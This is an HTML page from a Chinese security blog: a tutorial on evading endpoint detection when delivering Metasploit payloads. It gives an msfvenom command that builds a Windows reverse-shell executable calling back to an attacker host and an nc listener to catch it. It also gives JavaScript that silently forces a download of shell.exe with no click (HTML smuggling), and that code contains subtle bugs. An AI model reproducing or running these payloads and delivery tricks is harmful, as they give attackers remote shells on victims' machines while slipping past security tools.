@@ -1,0 +1,131 @@
+<!DOCTYPE html>
+<html lang="zh">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="renderer" content="webkit">
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+    <meta name="google-site-verification" content="TZE0rZyIqLl10trYu3BWBWa1Vmz6HFwhb2OcNEK4u-s" />
+     <link rel="shortcut icon" href= /img/clown.svg >
+    <title>
+        Clown
+    </title>
+    <meta name="description" content= IS IT JUST ME OR IS IT GETTING CRAZIER OUT THERE? >
+    <meta name="keywords" content= Blog,Hexo,Theme,Clown,ME >
+    
+<link rel="stylesheet" href="/libs/highlight/styles/monokai-sublime.css">
+
+    
+<link rel="stylesheet" href="/libs/font-awesome/css/font-awesome.min.css">
+
+    
+<link rel="stylesheet" href="/css/style.css">
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body id="bodyx">
+    <div class="hd posts">
+    <a href="/index.html"><i class="fa fa-home
+ replay-btn" aria-hidden="true"></i></a>
+    <div class="post-title">
+        <p>
+            EDR规避与绕过载荷生成篇
+        </p>
+        <hr>
+    </div>
+    <div class="post-content">
+        <p><strong>1、分阶段与部分阶段有效负载</strong></p>
+<p>MSF中:</p>
+<p>​	windwos&#x2F;shell_reverse_tcp是一个简单的非分阶段的反向TCP SHELL 有效负载。</p>
+<p>​	windwos&#x2F;shell&#x2F;reverse_tcp是一个简单的分阶段的反向TCP SHELL 有效负载，体积会较小，规避率比较高。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -l payloads //用于查看payload清单</span><br></pre></td></tr></table></figure>
+
+<p><img src="/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%87/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%871/index/image-20221229143944360.png" alt="载荷图"></p>
+<p><strong>2、构建一个paylaod</strong></p>
+<p>载荷(分阶段类似)：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sudo msfvenom -p windows/shell_reverse_tcp LHOST=&lt;会连IP&gt; LPORT=&lt;会连端口&gt; -f exe -o /var/www/html/shell.exe </span><br><span class="line">参数:</span><br><span class="line">	-p 指定payload类型</span><br><span class="line">	-f 指定生成格式</span><br><span class="line">	-o 指定payload生成路径</span><br></pre></td></tr></table></figure>
+
+<p><img src="/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%87/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%871/index/image-20221229145023995.png" alt="payload生成"></p>
+<p><strong>3、监听回连</strong></p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sudo nc -lnvp 4444    </span><br><span class="line">参数：</span><br><span class="line">	-l 监听模式</span><br><span class="line">	-n 避免DNS</span><br><span class="line">	-V 显示详细细节</span><br><span class="line">	-p 指定监听TCP端口</span><br></pre></td></tr></table></figure>
+
+<p><img src="/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%87/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%871/index/image-20221229145348660.png" alt="NC监听回连"></p>
+<p><img src="/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%87/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%871/index/image-20221229150720876.png" alt="回连成功"></p>
+<p>4、左键单击连接触发下载</p>
+<p>生成一个html页面，超链接本地恶意文件执行单击下载。</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">&quot;/shell.exe&quot;</span> <span class="attr">download</span>=<span class="string">&quot;shell.exe&quot;</span>&gt;</span>DownloadMe<span class="tag">&lt;/<span class="name">a</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%87/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%871/index/image-20221229151624791.png" alt="image-20221229151624791"></p>
+<p><img src="/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%87/EDR%E8%A7%84%E9%81%BF%E4%B8%8E%E7%BB%95%E8%BF%871/index/image-20221229151647577.png" alt="image-20221229151647577"></p>
+<p>5、利用JS无单击触发下载；</p>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">      	<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">function</span> <span class="title function_">base64ToArrayBuffer</span>(<span class="params">base64</span>)&#123;</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> binary_string = <span class="variable language_">window</span>.<span class="title function_">atob</span>(base64);</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> len = binary_string.<span class="property">length</span>;</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> bytes = <span class="keyword">new</span> <span class="title class_">Uint8Array</span>(len);</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">for</span> (<span class="keyword">var</span> i ;i &lt; len; i++)&#123;</span></span><br><span class="line"><span class="language-javascript">      			bytes[i] = binary_string.<span class="title function_">charCodeAt</span>(i);</span></span><br><span class="line"><span class="language-javascript">      			<span class="keyword">return</span> bytes.<span class="property">buffer</span>;</span></span><br><span class="line"><span class="language-javascript">      			&#125; </span></span><br><span class="line"><span class="language-javascript">      		&#125;</span></span><br><span class="line"><span class="language-javascript">      		</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> file = <span class="string">&#x27;codes&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript"></span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> data = <span class="title function_">base64ToArrayBuffer</span>(file);</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> c = <span class="keyword">new</span> <span class="title class_">Blob</span>([data],&#123;<span class="attr">type</span>:<span class="string">&#x27;octet/stream&#x27;</span>&#125;)</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> filename = <span class="string">&#x27;shell.exe&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      		</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> b = <span class="variable language_">document</span>.<span class="title function_">createElement</span>(<span class="string">&#x27;a&#x27;</span>);	</span></span><br><span class="line"><span class="language-javascript">      		<span class="variable language_">document</span>.<span class="property">body</span>.<span class="title function_">appendChild</span>(b);</span></span><br><span class="line"><span class="language-javascript">      		b.<span class="property">style</span> = <span class="string">&#x27;display: none&#x27;</span>;</span></span><br><span class="line"><span class="language-javascript">      		<span class="keyword">var</span> url = <span class="variable language_">window</span>.<span class="property">URL</span>.<span class="title function_">createObjectURL</span>(c);</span></span><br><span class="line"><span class="language-javascript">      		b.<span class="property">href</span> = url;</span></span><br><span class="line"><span class="language-javascript">      		b.<span class="property">download</span> = filename;</span></span><br><span class="line"><span class="language-javascript">      		b.<span class="title function_">click</span>();</span></span><br><span class="line"><span class="language-javascript">      		windows.<span class="property">URL</span>.<span class="title function_">revokeObjectURL</span>(url);</span></span><br><span class="line"><span class="language-javascript">      	</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>科普：</p>
+<p>​	浏览器有额外的高级对象。其中有Blob. 该Blob对象可视化一个 blob，它是一个不可变的类文件对象。这Blob是原始数据：您可以将其作为<a target="_blank" rel="noopener" href="https://www.w3docs.com/learn-javascript/arraybuffer-binary-arrays.html">二进制数据</a>或文本来读取。它由可选的字符串类型、blobParts、<a target="_blank" rel="noopener" href="https://www.w3docs.com/learn-javascript/strings.html">strings</a>以及BufferSource.</p>
+<p>javascript提供了一个btoa()函数，名为(binary-to-ASCII)的内置函数来执行Base64编码。！默认btoa()函数适用于8位字节(UTF-8)组成的二进制数据。但是，该btoa()函数接受一个字符串，其中每个字符代表一个 8 位字节。如果一个字符串包含不能用 8 位表示的字符（例如 UTF16），它就会中断。要处理 Unicode 字符，首先需要将字符串转义为 8 位字节数组，然后使用window.btoa()函数编码为 Base64：</p>
+<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="title function_">base64EncodeUnicode</span>(<span class="params">str</span>) &#123;</span><br><span class="line">  <span class="comment">// Firstly, escape the string using encodeURIComponent to get the UTF-8 encoding of the characters, </span></span><br><span class="line">  <span class="comment">// Secondly, we convert the percent encodings into raw bytes, and add it to btoa() function.</span></span><br><span class="line">  utf8Bytes = <span class="built_in">encodeURIComponent</span>(str).<span class="title function_">replace</span>(<span class="regexp">/%([0-9A-F]&#123;2&#125;)/g</span>, <span class="keyword">function</span> (<span class="params">match, p1</span>) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(<span class="string">&#x27;0x&#x27;</span> + p1);</span><br><span class="line">  &#125;);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> <span class="title function_">btoa</span>(utf8Bytes);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_">base64EncodeUnicode</span>(<span class="string">&#x27;Hello People&#x27;</span>) <span class="comment">// SGVsbG8gUGVvcGxl</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>Uint8Array</strong></p>
+<p>类型化<strong>Uint8Array</strong>数组表示一个 8 位无符号整数数组。内容初始化为<code>0</code>. 建立后，您可以使用对象的方法或使用标准数组索引语法（即使用括号表示法）来引用数组中的元素。</p>
+<p><strong>revokeObjectURL</strong></p>
+<p>在使用完对象 URL 后调用此方法，让浏览器知道不再保留对该文件的引用。</p>
+
+    </div>
+
+    
+</div>
+    <div class="footer" id="footer">
+    <p><h4>Copyright © 2020 | Author: Clown | Theme By <a class="theme-author" target="_blank" rel="noopener" href="https://github.com/Xunzhuo/hexo-theme-coder" style="font-size:14px; color: #969696">Coder</a></h4>
+    
+        <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+        <span id="busuanzi_container_site_pv">Page Views: <span id="busuanzi_value_site_pv"></span></span>
+        <span class="post-meta-divider">|</span>
+        <span id="busuanzi_container_site_uv">Unique Visitors: <span id="busuanzi_value_site_uv"></span></span>
+    
+    <label class="el-switch el-switch-blue el-switch-sm" style="vertical-align: sub;">
+        <input type="checkbox" name="switch" id="update_style">
+        <span class="el-switch-style"></span>
+    </label>
+
+    <!--         <script type="text/javascript">
+    var cnzz_protocol = (("https:" == document.location.protocol) ? "https://" : "http://");
+    document.write(unescape("%3Cspan id='cnzz_stat_icon_1278548644'%3E%3C/span%3E%3Cscript src='" + cnzz_protocol + "v1.cnzz.com/stat.php%3Fid%3D1278548644%26show%3Dpic1' type='text/javascript'%3E%3C/script%3E"));
+    </script> -->
+</p>
+</div>
+
+<input type="hidden" id="web_style" value="black">
+<input type="hidden" id="valine_appid" value="">
+<input type="hidden" id="valine_appKey" value="">
+
+<script src="/libs/jquery.min.js"></script>
+
+
+<script src="/libs/highlight/highlight.pack.js"></script>
+
+<script src='//cdn.jsdelivr.net/npm/valine@1.3.10/dist/Valine.min.js'></script>
+
+<script src="/js/js.js"></script>
+
+<style type="text/css">
+.v * {
+color: #698fca;
+}
+.v .vlist .vcard .vhead .vsys {
+color: #3a3e4a;
+}
+.v .vlist .vcard .vh .vmeta .vat {
+color: #638fd5;
+}
+.v .vlist .vcard .vhead .vnick {
+color: #6ba1ff;
+}
+.v a {
+color: #8696b1;
+}
+.v .vlist .vcard .vhead .vnick:hover {
+color: #669bfc;
+}
+</style>
+    <script type="text/javascript" color="173,174,173" opacity='1' zIndex="-2" count="99" src="//cdn.bootcss.com/canvas-nest.js/1.0.0/canvas-nest.min.js"></script>
+</body>
+</html>
